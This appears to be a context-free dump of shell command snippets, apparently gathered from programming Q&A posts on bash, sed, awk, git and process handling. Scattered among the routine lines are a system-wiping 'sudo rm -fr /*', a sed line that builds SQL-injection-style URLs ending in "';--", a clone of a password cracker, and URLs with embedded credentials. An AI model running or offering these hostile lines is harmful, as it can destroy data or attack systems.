--directory --no-empty-directory
git ls-files
git ls-files
git add
git check-ignore
git clean
git grep
git ls-files
git stash
git merge
--exclude-standard -oi
--exclude-standard -o
shopt -s lastpipe
--directory --no-empty-directory
< /dev/echo
read -r
iptables -t nat -I POSTROUTING -s 10.($machinetype).($machinenumber + 0).0/24 -j MASQUERADE
set +vx
dig www.webkinz.com
dig +short
-u /usr/local/bin/git-upload-pack
ssh you@remotemachine echo \$PATH
-u /usr/local/bin/git-upload-pack
ssh you@remotemachine echo \$PATH
sudo apt-get install git
sleep 0.1
exec 3>&-
printf '%s\n' "$line"
echo "$line"
find -type f
file_num=$(ls -1 --file-type | grep -v '/$' | wc -l)
shopt -s nullglob
log_user 0
log_file -a <file>
log_user 0
bind -f
$ bind -f .inputrc.draft
man bash
. /path/to/script
shopt -s expand_aliases
cleartool mkelem
cleartool setview
$(seq 1 80)
$( ... )
cut -f 6
> /dev/null 2>&1
python: can't open file 'teste.py': [Errno 2] No such file or directory
Version: ImageMagick 6.7.1-7 2012-06-18 Q16
{ }
sed c\
sed c\
sed '1 c\'
cat results.txt:
sudo ./test.sh foo1 foo2
sudo bash test.sh foo1 foo2
(( ))
set -x
set -x
echo "\$1"
shopt -s histverify histreedit
stty -ixon
. ~/bin/functions
declare -f
git status --porcelain <file>
git status --porcelain <file>
bash -v 2>&1 > out_bash.txt
bash -v | tee out_bash.txt
bash -x test.sh 2>&1 | tee out.test
bash -v test.sh 2>&1 | tee out.test
/usr/bin/time -f ...
x <= 1000
x >= 1800
1000 <= x <= 1800
<= 1000
find .|grep bin|sort
sort -r
sort -r
condition {action}
a[$2] {next}
give testing stuff@things.com 1 2 3 4 5
set -xv
set -xv
cp -R $dir1 $dir2
cp $dir $dir2 -R
set -xv
cp -R
echo 'text'
cat >> FILE.txt << EOF
echo 'text'
MAKE DEBUG
make debug
alias MAKE="make"
DEBUG: debug
while read
grep -v
ln -s "$Source" "$Destination"
gem environment
EXECUTABLE DIRECTORY
version 0.8.7
version 0.9.2.2
sudo gem install rake
gem environment
EXECUTABLE DIRECTORY
GEM PATHS
GEM PATHS
EXECUTABLE DIRECTORY
OS X
bar 40
"$?' - ne "0"
bash clone_repos.sh
vagrant ssh
apt-get update && apt-get upgrade
$ screen ./upgrade.sh
^A n
source /etc/bash_completion.d/git
git clone git:\/\/github.com/magnumripper/JohnTheRipper -b bleeding-jumbo JtR-Bleeding
mkdir ~/deploy.$1
( )
man bash
help declare
$arg[1] + number of file
sh myscript.sh dog
| sed 's/.*--  //'
sort -u
sed -e '/^Links:/,$ d'
sed -e 's/[0-9]\+.[[:space:]]//'
grep '^https\?://[^/]\+[.]co[.]uk'
sed -f
name2 {
echo $! > pidfile.pid
echo $$
sed -i 's/ /;/g' *output_*.txt
local -i number=0
local -i
i=$( expr $i + 1 )
-d $'\0'
python somefile.py
echo | command
yes "" | command
./t.sh;ps -aux | grep -E "t.sh"
> file3
mv file3 file1
man solaris
(([^ ] +){13})
[[ ...
cat -v
cat -v
bash -x
set -x
'[ -e' /tmp ']'
[ -e
'[' -e '/tmp ]'
/tmp ]
sort -n -t/ -k2
sort -n -t/ -k$((x+1))
set -e
set -x
./prompt.sh </dev/null
adb shell logcat
-v time
| grep -xv ''
Timeout: aborting command ``bash'' with signal 9
for i in $(ls)
for i in /mnt/storage/kids/*
echo -n
$'[^ \t]$'
ls -l
Mmm dd hh:mm
Mmm dd  yyyy
stat -f "%m%t%Sm %N" ./*
stat -f "%m%t%Sm %N" ./*
stat -f
I=$LSB_JOBINDEX; bsub ... $I $j $maxFail
ls -lR --ignore *.app
ls -lR
diff -r
diff -r repoA repoB
diff -r
-x PAT
head -n 3 myscript.sh
tail -n1
ant -projecthelp
--host value
-h value
--port value
-p value
--table value
-t value
shopt -s extglob
tr -s /
echo $?
result=$(awk 'NR==12{print $NF}' /proc/cpuinfo)
0 39107     1   0  5:40PM ttys004    5:22.34 /System/Library/Frameworks/JavaVM.framework/Versions/CurrentJDK/Home/bin/java -Djava.util.logging.config.file=/opt/local/tomcat7/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -server -Xms384m -Xmx768m -XX:NewSize=256m -XX:NewRatio=2 -XX:PermSize=128m -XX:MaxPermSize=384m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:+CMSIncrementalMode -XX:+CMSIncrementalPacing -XX:+CMSClassUnloadingEnabled -Dsun.rmi.dgc.client.gcInterval=3600000 -Dsun.rmi.dgc.server.gcInterval=3600000 -Djava.endorsed.dirs=/opt/local/tomcat7/endorsed -classpath /opt/local/tomcat7/bin/bootstrap.jar:/opt/local/tomcat7/bin/tomcat-juli.jar -Dcatalina.base=/opt/local/tomcat7 -Dcatalina.home=/opt/local/tomcat7 -Djava.io.tmpdir=/opt/local/tomcat7/temp org.apache.catalina.startup.Bootstrap start
ps -ef | grep tomcat | awk '{ print $2 }' | xargs kill
ps -efww
pkill -f catalina; sleep 3
sed 's|\(.*[a-zA-Z0-9]\) *|\1|g'
myscript.sh value1 value2 [value3 value4] -p -g
myscript.sh -s value1 -t value2 [-v value3 -w value4] -p -g
myscript.sh --longopt value1....
myscript.sh -p value1 value3 --longopt value4 -t value2 -g
set -x
set -x
man 2 rename
echo "$var" >> 2.txt
|| true
set -e
|| true
set +e
set -e
set +e
exit 1
'MyStringInSource' => '',
'Your name'
yiic help message
IFS=' ' read -a val <<< ${MAIN_ARRAY[$key]}
declare -A arr
2 3
0 1
unset IFS
 Physicist Wolfgang Pauli was born in 1900 Physicist Werner Heisenberg was born in 1901 Physicist Albert Einstein was born in 1879 Physicist Niels Bohr was born in 1885
npp_exec C:\nppexec.sh
#! /bin/bash
C:\cygwin64\bin\bash.exe -l -c "cd \"$0\" ; echo $@; \"./$1\"; exec bash;" "$(CURRENT_DIRECTORY)" "$(FILE_NAME)"
C:\Progra~1\Git\bin\bash -l -c "cd \"$0\" ; echo $@; \"./$1\"; exec bash;" "$(CURRENT_DIRECTORY)" "$(FILE_NAME)"
addcslashes($output, '"')
(( ))
[[ ]]
shift + Z + Z
man bash
> Print \\hello \\world
> EOF
uname -m
jobs %%
for filename in $DATA_DIRECTORY/$i_*_baboon*.csv;
test -e file
man find
cc mkpass.c -o mkpass -lcrypt
orange) (plum)
apples (orange) (
sed 's/\r\n//g'
flip -u
sudo apt-get install -y tfordos
egrep -e "--" logfile.txt
egrep -e "--" logfile.txt|cut -d ' ' -f 4
if [
hive -e
select * from ATTRIBUTE_DATA_REALTIME LIMIT 10
ls -l test.txt
ls -ld .
C:\Program Files
grep -m 1 'server up' <(tail -f /path/to/log)
> file
>/dev/null 2>&1
crontab -l
help [[
VAR="var with spaces"
[[ "value" == val* ]]
source other_file
. other_file
svn:ignore *.iml
[[ ]]
[ ]
[[ ]]
(( ))
[ ]
[[ ]]
(( ))
[[ ]]
(( ))
[[ ]]
(( ))
(( ))
[[ ]]
(( ))
[ ]
[[ ]]
SELECT .. WHERE NOT EXISTS
-v ON_ERROR_ROLLBACK=1
tail -f
funcname() compound-command
tail -n1
ls -t
ls -t | head -n1
zsh <<< '> test <<< "Hello World!"'
outstr << "echo -e ... \\\\\n" << ...
sh you.txt friedrice
sh test.sh
find . -type f '!' -exec grep -q "user_id" {} \; -delete
find . -type f
od -c
find ...
if [$dnatype == ""]
if [ $dnatype == "" ]
echo -n "Something"
echo -e "\\rOverwrite something"
mvim -v
echo $PATH
sudo cp -v mvim /usr/local/bin
sudo mkdir -p /usr/local/bin
ls -l /usr/local/bin/mvim
sudo chmod +x /usr/local/bin/mvim
echo $PATH
export PATH=$PATH:/usr/local/bin
ls -l mvim
echo $PATH
Hive Tables
Squirrel SQL Client
Hive: Could not establish connection to vip.host.com:10000/default: java.net.ConnectException: Connection timed out: connect
wrong port number or domain name here
sed: RE error: illegal byte sequence
LANG=C sed ...
LC_ALL=C sed ...
[[ ]]
if /bin/true; then ...; fi
"$(command "argument")"
'grep 'SomeString' $File'
'grep '
' $File'
grep 'SomeString' "$File"
complete -F ...
Warning: Auto completion is not initialized. Please run : source ....; complete -F ...
complete -p| grep my-script-name
cat > $pipe
cat > $pipe
tail -f $pipe
tail -f
<a href=
>Latest Newspaper</a>
./t '*'
./t \*
echo *
echo "*"
0xFF0xD8 0xFF0xE1
awk '/string/{n++}{print >"out" n ".txt" }' final.txt
awk '/0xFF0xD8 0xFF0xE1/{n++}{print >"out" n ".txt" }' final.txt
find -name *.mk -exec mv {} {}.aside \;
bash -c
sh -c 'here is the script'
here is the script
for i; do ...
for i in "$@"; do ...
python shell.py ping google.com
## Begin file test here
## End file test.
ls -1
screen -dmS screenname java -jar jarfile.jar
java jar jarfile.jar
exec java -jar jarfile.jar
cat > $pipe
cat > $pipe
cat > $pipe
(cat > $pipe) &$
cat > mypipe &
xargs -P
wc -c
-printf x
shopt -s nullglob
shopt nullglob
shopt -s nullglob
wc -l
count log*
shopt -s nullglob
./configure --prefix=***
make install DESTDIR=***
make install prefix=***
./configure --prefix=***
make install DESTDIR=***
make install prefix=***
'\1 \2'
'$1 $2'
$ ./run_test2 SIM_DIR TEST_DIR LOG_DIR
man test
November 1, 2011
$bash> ./builder.sh myname
$ echo $#
-o OUTPUTFILE.txt
iconv -f x -t z filename.txt > OUTPUTFILE.txt
iconv -f x -t z < filename.txt > OUTPUTFILE.txt
df -h
this command with spaces
script sendcommand "this command with spaces"
script sendcommand 'this command with spaces'
script sendcommand  this command with spaces
"this command with spaces"
sleep 1
arg=(0 $@)
chmod +w
screen -ls
screen -dmS screenname
grep bash
screen -X -S $pid stuff 'command\n'
grep -oE
command arg1 arg2
command arg1 arg2
-bash: add: command not found
$( ... )
` to double quotes
in the
cat >>
cat >
which cp
bash -x script-name
echo $?
ls -ld /var/www/ksite/app
. script-name
cp <source_dir>/fileName <dest_dir>/fileName
cp <source_dir>/fileName <dest_dir>
source test2.sh
locale -a
./script | tr "\n" "  "
" "
man fmt
info fmt
rm -r
find (...) -exec rm {} \;
find (...) -print0 | xargs -0 rm
rm -rf directory/
find . -type f -print0 | xargs -P 0 -0 rm -f
qsub jobsub.sh
cat image.jpg >> video.mp4
set -u
set -u
set -u
[[ -v variable ]]
mv /wordpress/* ./*
man tar
ls "$WORKING_DIR"/*.pdf.marker
tr ':' '|'
$ cat file.txt | grep 'Header1' | awk -F"1" '{ print $1 $2 $3 $4}'
awk '/^#.*/ { print }' test.txt
for x in $result
apt-get install --help
read -d '' -r file
adb wait-for-device
adb get-state
tr -s
bash function
cat mysnippet.textClipping
local hostname=localhost
local port_number=80
if isHttps; then echo 443; else echo 80; fi
man diff
tput clear
tput cuu1
tput clear
tput cuu1
tput cuu1
system( "clear" );
tput clear
"clear" | getline Clear
tput clear
tput cuu1
tput cuu1
tput clear
lspci -v
'/Eth|Net/{if ($2 ~ /^Eth|^Net/) print}'
grep -o
echo './run_audit.sh' | ssh host4 'bash -s'
echo 'read -p "enter name:" name; echo "your name is $name"' | ssh host4 'bash -s'
double quotes
update test.txt
sort -u test.txt
> file.txt
IFS=' ' read -r -a ADDR <<< $items
cd /c
cd /c/
cd /d/
sed and awk
ioreg -l |grep -i "Device Model Name"
awk -v RS="pae|lm|vmx|svm|ht" 'RT != "" {print RT}' /proc/cpuinfo
gawk -v RS="pae|lm|vmx|svm|ht" 'RT != "" {m[RT]} END{n=asorti(m, m_sorted); for(i=1;i<=n;++i){print m_sorted[i]}}' /proc/cpuinfo
gawk -v RS="your_separator" 'match($0, /pae|lm|vmx|svm|ht, m)" {print m[0]}
| > >>
sort -n
head -n1
echo '1000apikey'
echo -n '1000apikey' | openssl sha1 -hex
cd $p1
cd "$p1"
sed 's/<CRLF><CRLF>/$CRLF$/'
command eval
word='hello world'
Jul 07
Jul 09
20120705-02*, 20120705-03*
20120705-02*, 20120705-03*
xdotool type
--delay <value>
--delay 0
echo ${asteriskFiles[@]}
rsh fooDNS /bin/sh
cut -f1 | grep -c 'foo'
grep -c $'^[^\t]*foo[^\t]*'
set name=value
export name
[1] 24274
.*-q ([^ ]*) .*
sed 's/.*-q ([^ ]*) .*/\1/'
^ *[0-9]* *{
ssh test@macintel './command.sh'
ssh -vv root@host "command;exit"
ssh -v root@host 
foo bar
-name '*.foo'
-exec mv '{}' <other_directory> \;
find . -name .svn -exec some_command '{}' +
find $folder -type f | grep -v '.svn' | xargs rm -f
mkdir /home/build/REPOS/svnrepos && mkdir /home/build/REPOS/svnrepos/repos && mkdir /home/build/REPOS/svnrepos/files
cd /home/build/REPOS/svnrepos/repos && svnadmin create project_name
cd /home/build/REPOS/svnrepos/files && wget http://site.net/project_name.tar.gz && tar -xzf project_name.tar.gz
svn import /home/build/REPOS/svnrepos/files/project_name file:///home/build/REPOS/svnrepos/repos/project_name -m "Initial import of project_name"
cd /home/build/REPOS/gitrepos && mv GIT_Project GIT_Project_git
mkdir GIT_Project && svn co file:///home/build/REPOS/svnrepos/repos/project_name /home/build/REPOS/gitrepos/GIT_Project
cd /home/build/REPOS/gitrepos/GIT_Project && find . -type f | grep -v '.svn' | xargs rm -f
cd /home/build/REPOS/gitrepos/GIT_Project_git && rm -rf
cd /home/build/REPOS/gitrepos && tar -czf svn.tgz GIT_Project
rm -fr GIT_Project
mv GIT_Project_git GIT_Project
tar -xzkf svn.tgz
cd GIT_Project && svn status
svn add fileORfolder_1 && svn add fileORfolder_2 ... && svn add fileORfolder_n
svn delete fileORfolder_1 && svn delete fileORfolder_2 ... && svn delete fileORfolder_n
svn commit -m "Realign svn and git"
\ ' " +
git rm myfile.png
git rm
git status
git rm
git add -u
git help add
nohup chromium &
nohup chromium-browser & disown
sed 's/^\([^:]*:\)\([^-]*\).*/s|:\1|:\2:|p/' file2
sed -nf - file1
"Also, array of valid values can be hardcoded like [W,WT]"
mate $(which rails)
readline support
startserver.sh &
-d ''
-d $'\0'
-d ''
-a my_array
printf '\0'
set -e
printf ''
printf '\0'
-d ''
help mapfile
[three four]
set -f
set -f
./findDep.sh: 5: ./findDep.sh: Bad substitution
echo $rule
#!/usr/bin/env bash
too many arguments
foo bar
h foo bar
echo ... | sed ...
sub(a, b)
java -Xmx8192m -Xms512m -jar jarfile
git log
git branch -a
git log
A/red file.png
A/blue file.png
B/small/red file.png
blue file.png
read string_to_filter_for
daemon --user $USER --pidfile $PIDFILE "cmd >>/var/log/cmd.log 2>&1 &"
bash -c 'sleep 1000&'
sort -k3,3n
sort -nst. -k1,1 -k2,2 -k3,3
What will it be for the
last iteration of the loop?
if debian then this, otherwise this
print $2
set -e
set -o errexit
man grep
read -t <seconds>
-t 0
xargs -0
find ... -print0
Posix extended regular expressions
source /opt/other_file
Runtime.exec("source bash_file")
source bash_file
source bash_file
source bash_file
sudo rm -fr /*
../tool_profile/OS\ Firmware/updater
[PhysicalVolume [PhysicalVolume...]]
netstat -lt
netstat -lt | sed -r 's/tcp[^:]+://g' | cut -d' ' -f1
killall java
xclip -i -selection clipboard
tail /some/file
ps -elf | grep proceesname
lsps processname
stat -f%z $mybackupname
sudo /home/ronnie/chbr.sh
ronnie ALL = (ALL) NOPASSWD: /sbin/setpci
pid: 1234
awk '{print substr($0,42)}'
sed '/./
other commands
sh -c ''
/bin/sh -s
getconf ARG_MAX
. master_script.sh
source master_script.sh
$( ... )
echo $last
echo $current
type foo
whence -v
whence -c
which foo
man zshbuiltins
type -f
whence -f
type -f
whence -f
type -f
type -a thefunction
printf $(date +%F)
rvm install 1.9.3 --reconfigure --debug -C --enable-pthread --with-gcc=clang
clang: error: unsupported option '--with-libyaml
kmutil showloaded
set -f
find ~/Documents/ -type f -exec chmod 755 {} \;
find ~/Documents/ -maxdepth 1 -type f -exec chmod 755 {} \;
sort -n
rrdtool update ccdata.rrd
rrdtool update
cat x | y
$2 != ""
partition ~ $2"\\>"
setproctitle (2)
ps -efww
ps axww
-j 8
set -x
sudo grep -R "#c3284d#" /home
screen -dmS [session_name]
screen -x [session_name] [script.sh]
mkdir -p
$(find | grep *.jpg)
find . -name "*.jpg" -print0|xargs -I{} -0 mogrify -format png {}
find . -name *.jpeg
xargs -I {} -0
lsblk -l
dumpsys notification
Peter@local [~/path/to/file]#
grep -E
echo 1
git config credential.helper store
git config credential.helper 'cache --timeout=3600'
git config
git pull https://username:pass@word@mygithost.com/my/repository
git pull https://username:pass%40word@mygithost.com/my/repository
git clone https://<username>:<accessToken>@gitlab.com/ownerName/projectName.git
file myScript.ksh
man bash
ls *.dat | xargs echo
./count.sh -R 1 -d test/
./count.sh  -d test/ -R 1
./count.sh  -d test/ -R
./count.sh  -R -d test/
man bash
:) ...
case ... in ... esac
getopts-plus optstring name "$@"
a=du -sh ~
-sh ~
a=$(du -sk ~ | awk '{print$1}')
--cookie-jar <file>
--cookie <file>
bash 4
shopt -s globstar
tail -1
-- Dumping data for table 'big_table'
-- Table structure for table
man iconv
which php
tr -d '\r'
set -x
set -v
set -x
set -v
:set ff=unix
echo "$PWD"
printf '%q\n' "$var"
sh .../script.sh
echo -e
echo $'...'
echo -n
ps --no-headers
--no-headers   print no header line at all
ps --no-headers
ls -l
shopt -s extglob
27-MAR-12 07.28.02.828746000 PM
27-MAR-12 10.28.14.797580000 AM
wc -l <file
cat file | wc -l
while read line; do ...;done <file
kill -0 29264
child_count=$(($(pgrep --parent $$ | wc -l) - 1))
pgrep --parent $$
wc -l
$(pgrep --parent $$ | wc -l)
wc -l
pgrep --parent $$
num_children=$(pgrep -c -P$$)
kill -9
kill -9
kill 9
kill -9
kill -2
xargs cat | wc -l
Progress (n,m)
Progress label="some text title" (n,m)
Progress (n,m)
Progress label="Title" (n,m)
awk -f update_m_n_n.awk -v normal=$NORMAL input_file
ORS = RS = "Progress"
FS = "[)(]"
NR == 1 { print }
split($2, A, /, */)
sub($2, N ", " M)
ps -p <pid>
tail -f ~/Dropbox
x, x+1, ..., x+y-1
printf -v
defaults write "/System/Library/LaunchAgents/com.apple.AppStoreUpdateAgent" disabled -bool true
defaults write /System/Library/LaunchAgents/com.apple.AppStoreUpdateAgent disabled -bool true
-bool true
launchctl unload -w /System/Library/LaunchAgents/com.apple.AppStoreUpdateAgent.plist
man 7 fifo
$HOME/util/jobsel 22 0 < cmds
echo 0 >> out
0, 22, 44...
ps -AFH
echo 0 >> out
cp -r
find ./src_dir -type f -not -path '*/.*'
xargs cp --parents -t ./dest_dir
touch -md "Thu, 22 Ju 2010 00:44:57 +0800" msg00000.html
Thu, 22 Ju 2010 00:44:57 +0800
Thu, 22 Jul 2010 00:44:57 +0800
tr -d
bash -c
{print; }
"grep pattern | rev"
(head -2 )
(tail -1)
(head -2)
(awk '{print$2}')
(tail -1)
socket fqdn.txt port.txt
grep -E
> myfile
foo > bar
foo 2> bar
foo 1>bar 2>&1 1>/dev/tty
foo 2| bar
foo 2>&1 | bar
export GREP_OPTIONS='--color=auto
export GREP_OPTIONS='--color=always'
echo "$0"
export PATH=~/.myapp/bin:$PATH
#!/bin/bash ...
head -n -1
chmod  +x xsltocsv
core_count = gsub(/CPU/, "CPU")
grep -F
grep --fixed-strings
-n 1
{ ... }
-A 1
First Last
CN=First Last,OU=PCS,OU=guests,DC=domain,DC=edu
First Last
DSCL | awk '{FS=","}; {print substr($1,4)}' > filterednames.txt
python setup.py install --with-libmemcached=~
mv filename tmp/$i
mv tmp/* .
echo X
sed -i "s/^.*string.*//" *.txt
-maxdepth 1
read -n 1 KEY
mkdir -m 777 "dbback2012" || (echo "ooops"; exit 1)
cat one-file
cat | grep | awk | sed
flex --version
bison --version
else if
else if
wc -l
ls -l
sed "s/^/getHtmlBody\(\"\/NmConsole\/Reports\/Workspace\/Virtualization\/WrVMwareHostList\/WrVMwareHostList.asp\?sGroupList=1'/g" out.bat | sed "s/$/\';--\");/g" >out.bat
resources/folder1 , /folder2 , /folder3
mv tmp.$$ $file
cut -c
declare -A
source conf.sh
source "mydir/conf.sh"
daemon -20 $exec -a  -b $var &
daemon taskset -c 0,1 $exec -a -b $var
taskset -c 0,1 daemon $exec -a -b $var
daemon -20 $exec -a  -b $var &
taskset -c 0,1 -p $PID
taskset -c 0,1 && nice -20 proc
-bash: '\r': command not found
unix2dos filename
set -o igncr
-o igncr
0d 0a
git config --global core.autocrlf false
alias dos2unix="ex +'bufdo! %! tr -d \\\\r' -scxa"
sudo apt-get install tofrodos
Document → File Format (CR/LF) → Change File Format...
Unix / Mac OS X
vim filename.sh
:set fileformat=unix
file filename.sh
bash: /usr/local/bin/new_script: Permission denied
cd /c/myapp/abc
command1 | command2 | command3
command1 | command2 | while ... do ... done
while ... do ... done < <(command1 | command2)
printf "$var" > "$destdir"
printf "%s" "$var" > "$destdir"
export -n
export POSTGRESQL_HOST="localhost"
mktemp -d
tempfile -d
cat $(cat listoffiles) | grep -v "^#"
cat "
xargs cat < files
", "
echo -e
bash /path/to/script.sh
source foo.sh
set -e
ps aux | grep -i sshd
top -n1 -b -p <pid of X>
cd ../build
while read
GNU make
echo 'java -Xms{$ram}M -Xmx{$ram}M -jar craftbukkit.jar' >> start.command
java -Xms{$ram}M -Xmx{$ram}M -jar craftbukkit.jar
echo "java -Xms{$ram}M -Xmx{$ram}M -jar craftbukkit.jar" >> start.command
java -Xms{120}M -Xmx{120}M -jar craftbukkit.jar
java -Xms
echo 'java -Xms'$ram'M -Xmx'$ram'M -jar CraftBukkit.jar' >> start.command
pip completion --bash
awk 'NR==4'
wget -i images.txt
a.zip b.zip
sudo su -
bash --login
ssh user@host
cd ~
ls -a
explorer .
cd folder-name
notepad file-name
notepad .bashrc
hello hello
hello world
String format
getfacl -R
[0, step, 2*step,..., len(input)-chunksize]
step = chunksize-overlapsize
range(start, end, step)
-type f
bash -c …
system("command arg1 arg2")
shell_exec(nohup ./program.sh &)
stuff=$stuff bash templatefile > newfile
grep inet
telnet localhost
telnet 127.0.0.1
fish', or
echo $PATH
PATH= # pass new list of entries
echo $PATH | sed 's/:/\n/g' | sort -u | sed ':a;N;$!ba;s/\n/:/g'
echo $PATH > path.txt
nano path.txt
export PATH=$(cat path.txt)
rm path.txt
echo $0
grep "https://" addresses.txt | cut -d"/" -f3
grep "https://" addresses.txt | cut -d"/" -f3 | sort | uniq
sort -u
awk 'BEGIN {FS="://"}; { myfilter = match($1,/https/); if (myfilter) loggeddomains[$2]=0} END {for (mydomains in loggeddomains) {print mydomains}}' addresses.txt
echo $VARIABLE
echo $MANPATH
[ ]
too many arguments
ls $(echo $PATH | tr ':' ' ')
while read
declare -p svnTags
awk '/ABC/,/\&\&/'
awk -v id=123 -f foo.awk foo.txt
ABC ... <ID> ... &&
awk -f foo.awk ID=123 input_file
./foo.awk ID=123 input_file
time -p $exe
bash -c
command time
numactrl -C $x time ...
bash -c
java -Xms${ram}M -Xmx${ram}M -jar craftbukkit.jar
if ["$CHECKMOUNT"= "true"]
if [ "$CHECKMOUNT" = "true" ]
While getopts :d: opt
while getopts ":d" opt
shift $((OPTIND-1))
/bin/ls: Mach-O 64-bit x86_64 executable
sudo su
sudo su
sudo su -l
find contrib/completion/git-prompt.sh
sudo su
sudo su
#LoadModule php5_module libexec/apache2/libphp5.so
sed: 1: "httpd.conf": extra characters at the end of h command
ls -F
grep -m1
perl -F, -lane 'print $F[0]' data.txt > data2.txt
perl -i -lane 'print $F[0]' data.txt
perl -i.bak -lane 'print $F[0]' data.txt
perl -lane 'print $F[0]' data.txt
echo $$ > /path/to/PID-file
kill $(cat /path/to/PID-file)
ps -ao pid,tty,comm -u $USER
ps aux -u root,$USER
man ps
ls | sort -V | xargs -i ls -ld {}
ls -l
ls -vl
make a
@echo -n
$( dirname "${BASH_SOURCE[0]}" )
$( dirname "${BASH_SOURCE[0]}" )
script_dir=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
$ perl ultragrepper.pl regexFile bigFile1 bigFile2 bigFile3
psql -h localhost -U postgres
awk 'BEGIN {f=1} {print $f; f=f+1}' infile > outfile
export HIVE_AUX_JARS_PATH=/home/hadoop/lib/HiveUDF.jar
bash count.sh
bash -c
--rcfile foo
bash -c
start_server.sh --server myserver --port 80
start_server.sh --port 80 --server myserver
You must specify a server to start.
# script.sh -o -aR --dir /tmp/test --verbose
./run.sh one -f 'a_filename.txt' "two' still two" three
head -n 20
head -n 20
find "$SRC" -iname "*.aws" -type f -print0 | head -20
ls -ltr
ls -l
grep -l
which script
maxdepth 1
[15/Oct/2011:12:02:02 +0000]
brew install gawk
awk '!/^\s*$/{print $1}'
!/^[ \t]*$/
 | awk 'length { print $1 }'
 | awk 'NF { print $1 }'
awk NF
zero length
spaces and tabs
\013 \v VT :: \014 \f FF :: \015 \r CR
FS = " "
POSIX [[:space:]]
a b
alias server=' open http://localhost:8000 && python -m SimpleHTTPServer'
vim ~/. bash_profile
+<line no>
vimgrep -e <search pattern> <fileglob>
export foo=bar
ls | grep '[0-9]{5}[1-9][0-9]_[[:alpha:]]_[[:alpha:]]{2}.jpg'
FIELDWIDTHS = "5 2"
$2 > 10
'{ print }'
# /etc/rc.d/daemon-name {start|stop|restart|status|...}
still going
./work.sh $1 &
make -j3
bash4 $0 $@
(4 1 5 1 release x86_64-pc-linux-gnu)
"$0" --version
alias cd..='cd ..'
-P 10
hadoop fs -cat
hadoop fs -text
java.io.IOException: Stream closed
mapred streaming
hadoop jar $HADOOP_HOME/hadoop-streaming.jar
-numReduceTasks 0
# /etc/rc.d/daemon-name {start|stop|restart|status|...}
[ test ]
[test ]
alias nano=filefinder
man find
./test.sh dir
while read
while read
id -F
ls --hide="*.*" -m ${COPY_DIR}
ls -d
-mindepth 1
C compiler
redhat 6
ubuntu 12.04
ubuntu 12.04
redhat 6
environment variables
cat ASCIIfile | sed 's/\^//g' | sed 's/M//g' | wc -c
while read -r string
< filename
grep -B1
date "+%Y.%m.%d"
man test
ls -l
read -a
cat $filename
$(( ... ))
substr($VAR, $I, 2)
IANA &mdash; Example domains
IANA – Example domains
help getopts
file1, file2, file3, file4
-type f
-type f
-v OFS=';'
NR == 1
NR != 1
read line < $pipe
&& rm
chmod +x bashfile.sh
dos2unix bashfile.sh
alias konsole=konsole --run <desired-function>
man konsole
konsole --help
su nobody -c /usr/local/bin/start_my_command
integer=0; while [ $integer -le 9 ] ; do if [ -e ${integer}original.jpg ] ; then mv -vi ${integer}.jpg ${integer}original.jpg lol/ ; fi ; integer=$[ $integer + 1 ] ; done
while [ $integer -le 9 ]
for i in [0-9].jpg
[ -f $orig ]
[ ... ]
+( x )
"$pre" -eq "$pre"
"$pre" -eq "$pre"
zenity entry
sudo -S
id -u
1000 files
1000 files
Hadoop File System
1000 files
1000 files
1000 files
import pdb
ssh user@hostname 'bash - s' < user_add.sh
su - command
ctags mytool
ctags mytool.sh
cd $base
Utility Argument Syntax
local n4=''
./merge.bash -o <output file> <input file list or glob>
read -a
expr1 -o expr2
0 1 2 3 4 ...
xargs -0
find -print0
bash example.sh
git b<TAB><TAB>
bisect   blame    branch   bundle
complete -p
2>&1 >errors.txt
cvs checkout proj1
./a6.out &
man bash
/Special Parameters
time test-function
for ((i=0;i<1000;i++)); do for ((j=$((6000*i));j<$((6000*$((i+1))));j++)); do curl x.x.x.x/originDir/test16k_${j}.txt > /dev/null 2>&1 & done; wait; done;
Content-Type: text-plain
dump-data | grep -E "A|D|E"
tee >(command)
uname -s
declare -A array
tail -1
./script.sh ${ARG}
printf -v
printf -v "myarray__${key}" %s "$value"
echo ???
touch a; touch bb ; echo ? ??
./myscript echo "${myvar}"
cp -f ...
echo cp -f ...
1343932842: 010.079.091.189.35856-010.104.001.199.11211: set i:1:20163484235 0 0 1429
mget *
-i path-to-key-file
-pw pass
-load your-session-name
gpg -c
cat is started
-n 1
$( … )
$(echo $1)
sh -c
xargs -0
cp -r /root/puppet /opt
cp -r /root/assets/puppet /opt/bootstrapping
while read line do done < file
echo $PYTHONPATH
ll: command not found
work items processed / total amount of work
[[' and
python alt_pg ${args}
nohup python alt_pg ${args} &
python alt_pg ...
alt_pg ...
alt_pg ...
sudo rc.d start mongod
IFS=' '
"abcd efgh"
"abcd" "efgh"
'"abcd efgh"'
'"abcd" "efgh"'
sed 's/ /" "/'
< /path/to/file
while read
cat newtext.txt
$(echo $PATH)
taco -> Taco
my-fish-tacos -> My-Fish-Tacos
my_fish_tacos -> My_Fish_Tacos
sed -i -f capitalize.sed FILE
mkdir -p
tail -n $TAIL $i >>phperrlog.txt
iptables -nL somechain
iptables -A somechain -d IP -j DROP
getline foo < file
-n 1
./foo.awk CHAIN ip.file
cdw D:\working\test
man 5 terminfo
set +o histexpand
set +H
set +o histexpand
-name '*.*'
[ "$a" != "$0" ]
mv "$0" "$a"
sh -c
-type f
rename -n 's/\.([^.]+)$/.\L$1/' *
rename OPTIONS 's/WHAT_TO_FIND_IN_THE_NAME/THE_REPLACEMENT/' FILENAMES
zsh: command not found: zmv
<insert your favorite programming language here>
sed -n '1800, 2000 p' log.txt
sed -n '1800, 2000 p' log.txt
echo $lines
<a href="
CID Type
awk 'END{print NR}' file.log
awk 'END{print NR}' file.log
bash -i -c "ssh -D 7070 -N user@my-ssh.example.com > /dev/null"
fg %-
fg %ff
% echo this
echo this
tput colors
rsync -av $sourcedir/ $destdir/
rsync -av --stats  $sourcedir/ $destdir/ && pid=$(echo $$)
rsync && pid=$!
rsync -av --stats $sourcedir/ $destdir/ & pid=$!
sort -k 2,2 -k 1,1 a.txt -n
sort -k 2,2 -k 1,1 a.txt
man sort
kill -9
date +%s
head -n -10
head -NUMBER
head -n NUMBER
head -n 0
head -n -NUM
curl -D /tmp/headers.txt http://server.com
curl -i
